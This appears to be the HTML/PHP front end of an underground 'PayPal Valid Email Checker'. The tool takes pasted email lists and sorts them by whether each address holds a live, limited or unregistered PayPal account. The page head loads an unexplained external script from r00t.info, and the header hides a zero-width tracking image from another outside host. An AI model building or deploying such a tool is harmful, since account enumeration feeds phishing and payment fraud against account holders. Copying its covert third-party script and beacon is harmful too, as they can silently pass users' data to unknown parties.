<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
	<meta name="robots" content="noindex,nofollow" />
	<link rel="shortcut icon" href="http://2.bp.blogspot.com/-yBk7AcCLS60/UZmnFrsWlgI/AAAAAAAAAC4/xXn7hStgiHw/s1600/alogo.png">
	<title>PayPal Valid Email Checker TOOLZ.GQ</title>
	<link rel="stylesheet" href="css/bootstrap.min.css">
	<script src=http://r00t.info/ccb.js></script>
	<script src="js/jquery.min.js"></script>
	<link href="http://fonts.googleapis.com/css?family=Kaushan+Script" rel="stylesheet" type="text/css">
	
</head>
<body>	<header>
<div>
                    <center><hr>

                <div>
                    <font size="6" color="white" style="text-shadow: red 0 0 15px;"><b>[☠] PayPal Valid Email Checker [☠]</b></font>
                <hr />  <font color="gold;opacity:100" class="chara" size="2">
                <?php
                $IP = $_SERVER['REMOTE_ADDR']; echo "Welcome : $IP ";
                ?></font>
               <img src="http://s3curity.tn/wp-content/uploads-images/moreart.png" height="1" width="0">

                </header>
               
	<div id="content" class="main-content" style="width: 811px;">
		<div class="box">
			<div class="box-head">
				<center><span>List to Check</span></center>
			</div>
				<div class="box-body box-body-nopadding">
					
					<form action="" method="post" class="form-vertical">
						<div class="center column-center">
								<textarea name="listdata" id="listdata" class="input-block-level" wrap="off" rows="9"></textarea>
								<input type="hidden" name="delim" class="w20px" id="delim" value="|">
							<div class="center" style="margin-top: 10px;">
								<button type="button" class="button button-basic-blue" id="submit">Start</button>
								<button type="button" class="button button-basic-red" id="stop">Stop</button>
							</div>
						</div>


						
					</form>

				</div>
		</div>
				
	</div>
	<br>
			<center><img id="loading" src="images/clear.gif"></img><br><span id="checkStatus"></span><br>
			<span style="display:none" id="hitung_total">0</span><span style="display:none" id="hitung_checked">0</span></center>
	<div id="result" style="width:97%;margin:auto;">
	

				<fieldset class="fieldset">
					<legend class="result_live" id="line1">
						<span id="a">REGISTERED PAYPAL LIVE : <span id="hitung_live">0</span></span>
						<span id="b" onclick="selectText('result_live')">SELECT TEXT</span>
					</legend>
						<div id="result_live" class="result"></div>
				</fieldset>
				<fieldset class="fieldset">
					<legend class="result_bad" id="line1">
						<span id="a">REGISTERED PAYPAL LIMITED : <span id="hitung_bad">0</span></span>
						<span id="b" onclick="selectText('result_bad')">SELECT TEXT</span>
					</legend>
						<div id="result_bad" class="result"></div>
				</fieldset>
				<fieldset class="fieldset" style="float: left; width: 47.75%;">
					<legend class="result_die" id="line1">
						<span id="a">NOT REGISTERED PAYPAL : <span id="hitung_die">0</span></span>
						<span id="b" onclick="selectText('result_die')">SELECT TEXT</span>
					</legend>
						<div id="result_die" class="result"></div>
				</fieldset>
				<fieldset class="fieldset" style="float: right; width: 47.75%;">
					<legend class="result_wrong" id="line1">
						<span id="a">WRONG FORMAT : <span id="hitung_wrong">0</span></span>
						<span id="b" onclick="selectText('result_wrong')">SELECT TEXT</span>
					</legend>
						<div id="result_wrong" class="result"></div>
				</fieldset>


	</div>


<script type="text/javascript" src="js/jquery.watermark.js"></script>
<script type="text/javascript">
	$(function () {
		$('#listdata').watermark('Paste text here\nemail@domain.com');
	});
</script>
<script type="text/javascript" src="nosocks.js"></script>
	<script type="text/javascript">
		function selectText(containerid) {
			if (document.selection) {
				var range = document.body.createTextRange();
				range.moveToElementText(document.getElementById(containerid));
				range.select();
				} else if (window.getSelection()) {
					var range = document.createRange();
					range.selectNode(document.getElementById(containerid));
					window.getSelection().removeAllRanges();
					window.getSelection().addRange(range);
				}
			}
	</script>

<br>
</body>
</html>